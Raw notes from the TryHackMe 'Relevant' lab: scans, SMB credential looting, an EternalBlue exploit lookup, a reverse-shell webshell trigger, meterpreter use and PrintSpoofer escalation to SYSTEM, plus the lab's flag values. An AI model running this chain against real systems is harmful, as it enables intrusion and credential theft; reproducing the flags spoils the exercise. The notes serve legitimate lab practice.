@@ -1,0 +1,219 @@
+nmap -A -p- 10.10.50.94     
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 11:50 +07
+Nmap scan report for 10.10.50.94
+Host is up (0.32s latency).
+Not shown: 65527 filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2021-08-05T04:58:33+00:00
+| ssl-cert: Subject: commonName=Relevant
+| Not valid before: 2021-08-04T04:00:09
+|_Not valid after:  2022-02-03T04:00:09
+|_ssl-date: 2021-08-05T04:59:14+00:00; 0s from scanner time.
+49663/tcp open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+
+
+└─# smbclient -L \\10.10.50.94                                                                    1 ⨯
+Enter WORKGROUP\root's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        nt4wrksv        Disk      
+SMB1 disabled -- no workgroup available
+                                                                                                      
+┌──(root💀lucy)-[/home/gd/Desktop]
+└─# smbclient //10.10.50.94/nt4wrksv
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Jul 26 04:46:04 2020
+  ..                                  D        0  Sun Jul 26 04:46:04 2020
+  passwords.txt                       A       98  Sat Jul 25 22:15:33 2020
+
+                7735807 blocks of size 4096. 5136915 blocks available
+smb: \> get passwords.txt
+getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \> exit
+                                                                                                      
+┌──(root💀lucy)-[/home/gd/Desktop]
+└─# ls
+ 25971.txt       cook.txt           important.txt   log1.txt      passwords.txt   winPEAS.bat
+ attention.txt  'gadoitq(1).ovpn'   kerbrute       'NS Linux 1'   relevant
+                                                                                                      
+┌──(root💀lucy)-[/home/gd/Desktop]
+└─# cat passwords.txt   
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                                                                                      
+┌──(root💀lucy)-[/home/gd/Desktop]
+└─# echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
+
+
+Bob - !P@$$W0rD!123
+                                                                                                   
+┌──(root💀lucy)-[/home/gd/Desktop]
+└─# echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
+Bill - Juw4nnaM4n420696969!$$$ 
+python zzz_exploit.py --target-ip 10.10.23.25 -port 445 'Bob:!P@$$W0rD-'
+
+sudo nmap --script vuln -p 135,139,445 10.10.50.94
+sudo: unable to resolve host lucy: Name or service not known
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 11:30 +07
+Nmap scan report for 10.10.50.94
+Host is up (0.31s latency).
+
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+Nmap done: 1 IP address (1 host up) scanned in 33.64 seconds
+
+searchsploit ms17-010                  
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'Eter | windows/remote/43970.rb
+Microsoft Windows - SMB Remote Code Execution Scanner (MS17 | windows/dos/41891.rb
+Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code | windows/remote/42031.py
+Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalB | windows/remote/42315.py
+Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB R | windows_x86-64/remote/42030.py
+Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SM | windows_x86-64/remote/41987.py
+------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+                                                                                              
+┌──(root💀lucy)-[/home/gd/Desktop]
+└─# searchsploit -m windows/remote/42315.py
+  Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
+      URL: https://www.exploit-db.com/exploits/42315
+     Path: /usr/share/exploitdb/exploits/windows/remote/42315.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+msfvenom -l payloads | grep windows | grep reverse | grep shel
+msfvenom -p windows/shell_reverse_tcp --list-options
+
+curl http://10.10.25.213:49663/nt4wrksv/myshell.aspx 
+
+meterpreter > cd Bob
+meterpreter > ls
+Listing: c:\Users\Bob
+=====================
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40777/rwxrwxrwx  0     dir   2020-07-26 04:03:37 +0700  Desktop
+
+meterpreter > cd Desktop
+meterpreter > ls
+Listing: c:\Users\Bob\Desktop
+=============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  35    fil   2020-07-25 22:23:52 +0700  user.txt
+
+meterpreter > cat user.txt 
+THM{fdk4ka34vk346ksxfr21tg789ktf45}
+
+meterpreter> getprivs
+shell
+whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+
+google.com
+SeImpersonatePrivilege privilege escalation
+https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
+
+https://github.com/itm4n/PrintSpoofer
+https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
+meterpreter >upload /home/gd/Downloads/PrintSpoofer.exe
+meterpreter >shell
+c:\Users\Bob\Desktop>PrintSpoofer.exe -i -c powershell.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami
+whoami
+nt authority\system
+PS C:\Windows\system32> cd c:\
+cd c:\
+PS C:\> cd Users
+cd Users
+PS C:\Users> cd Administrator 
+cd Administrator
+PS C:\Users\Administrator> cd Desktop
+cd Desktop
+PS C:\Users\Administrator\Desktop> more root.txt
+more root.txt
+THM{1fk5kf469devly1gl320zafgl345pv}
+
+PS C:\Users\Administrator\Desktop> get-content root.txt
+get-content root.txt
+THM{1fk5kf469devly1gl320zafgl345pv}
+
+
+https://www.aldeid.com/wiki/TryHackMe-Relevant
+https://steflan-security.com/tryhackme-relevant-walkthrough/
+https://www.hackingarticles.in/relevant-tryhackme-walkthrough/
+https://www.cybergoat.co.uk/writeup/Relevant-TryHackMe/
+https://github.com/Voker2311/CaptureTheFlag-walkthroughs/blob/master/Relevant%20Tryhackme%20walkthrough.txt
+https://bryanwendt.wordpress.com/2020/12/07/tryhackme-relevant-walkthrough/
+https://infosecwriteups.com/tryhackme-relevant-ctf-write-up-7705501b73dd
